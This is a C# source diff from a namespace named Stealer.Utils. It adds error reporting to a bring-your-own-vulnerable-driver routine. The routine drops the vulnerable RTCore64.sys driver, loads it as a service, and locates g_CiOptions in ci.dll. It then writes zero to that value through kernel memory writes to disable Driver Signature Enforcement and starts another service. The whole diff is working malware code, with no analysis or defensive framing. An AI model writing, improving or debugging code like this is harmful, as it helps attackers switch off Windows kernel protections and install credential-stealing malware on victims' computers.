@@ -124,8 +124,9 @@ namespace Stealer.Utils
 
         // ── Public API ──────────────────────────────────────────────────────────
 
-        public static bool DisableDSEAndStartService(IntPtr hSvc)
+        public static bool DisableDSEAndStartService(IntPtr hSvc, out string errorMsg)
         {
+            errorMsg = null;
             string vulnSysPath = Path.Combine(
                 Environment.GetFolderPath(Environment.SpecialFolder.System),
                 "drivers", "RTCore64.sys");
@@ -138,36 +139,52 @@ namespace Stealer.Utils
                 if (vulnBytes != null && vulnBytes.Length > 0)
                 {
                     File.WriteAllBytes(vulnSysPath, vulnBytes);
-                    vulnLoaded = StartVulnDriver(vulnSysPath);
+                    vulnLoaded = StartVulnDriver(vulnSysPath, out errorMsg);
+                }
+                else
+                {
+                    errorMsg = "BYOVD: Embedded RTCore64.dat resource not found";
+                    return false;
                 }
 
                 if (!vulnLoaded)
                 {
-                    // If file was already present or pre-loaded, check device handle
                     vulnLoaded = DeviceExists(VULN_DEVICE_PATH);
                 }
 
-                if (!vulnLoaded) return false;
+                if (!vulnLoaded)
+                {
+                    if (string.IsNullOrEmpty(errorMsg)) errorMsg = "BYOVD: Failed to load RTCore64 driver";
+                    return false;
+                }
 
                 // 2. Find g_CiOptions kernel address
                 IntPtr gCiOptionsKernelAddr = FindGCiOptionsAddress();
                 if (gCiOptionsKernelAddr == IntPtr.Zero)
+                {
+                    errorMsg = "BYOVD: Failed to locate g_CiOptions symbol in ci.dll";
                     return false;
+                }
 
                 // 3. Read original g_CiOptions
                 uint originalOptions = ReadKernelMemory32(gCiOptionsKernelAddr);
 
                 // Write 0 to disable DSE
                 if (!WriteKernelMemory32(gCiOptionsKernelAddr, 0))
+                {
+                    errorMsg = "BYOVD: WriteKernelMemory32 failed to clear g_CiOptions";
                     return false;
+                }
 
                 bool started = false;
                 try
                 {
                     started = StartService(hSvc, 0, null);
-                    if (!started && Marshal.GetLastWin32Error() == 1056)
+                    if (!started)
                     {
-                        started = true;
+                        int sErr = Marshal.GetLastWin32Error();
+                        if (sErr == 1056) started = true;
+                        else errorMsg = "StartService failed after DSE patch (Win32 error " + sErr + ")";
                     }
                 }
                 finally
@@ -185,8 +202,9 @@ namespace Stealer.Utils
 
                 return started;
             }
-            catch
+            catch (Exception ex)
             {
+                errorMsg = "BYOVD Exception: " + ex.Message;
                 return false;
             }
             finally
@@ -218,10 +236,16 @@ namespace Stealer.Utils
             catch { return null; }
         }
 
-        private static bool StartVulnDriver(string sysPath)
+        private static bool StartVulnDriver(string sysPath, out string errorMsg)
         {
+            errorMsg = null;
             IntPtr hSCM = OpenSCManager(null, null, SC_MANAGER_ALL);
-            if (hSCM == IntPtr.Zero) return false;
+            if (hSCM == IntPtr.Zero)
+            {
+                int scmErr = Marshal.GetLastWin32Error();
+                errorMsg = scmErr == 5 ? "OpenSCManager failed: Access Denied (Administrator privileges required)" : ("OpenSCManager failed (Win32 error " + scmErr + ")");
+                return false;
+            }
             try
             {
                 IntPtr hOld = OpenService(hSCM, VULN_SERVICE_NAME, SERVICE_ALL_ACCESS);
@@ -240,11 +264,20 @@ namespace Stealer.Utils
                     SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
                     sysPath, null, IntPtr.Zero, null, null, null);
 
-                if (hSvc == IntPtr.Zero) return false;
+                if (hSvc == IntPtr.Zero)
+                {
+                    int cErr = Marshal.GetLastWin32Error();
+                    errorMsg = "CreateService RTCore64 failed (Win32 error " + cErr + ")";
+                    return false;
+                }
                 try
                 {
                     bool ok = StartService(hSvc, 0, null);
                     int err = Marshal.GetLastWin32Error();
+                    if (!ok && err != 1056)
+                    {
+                        errorMsg = "StartService RTCore64 failed (Win32 error " + err + ")";
+                    }
                     return ok || err == 1056;
                 }
                 finally { CloseServiceHandle(hSvc); }
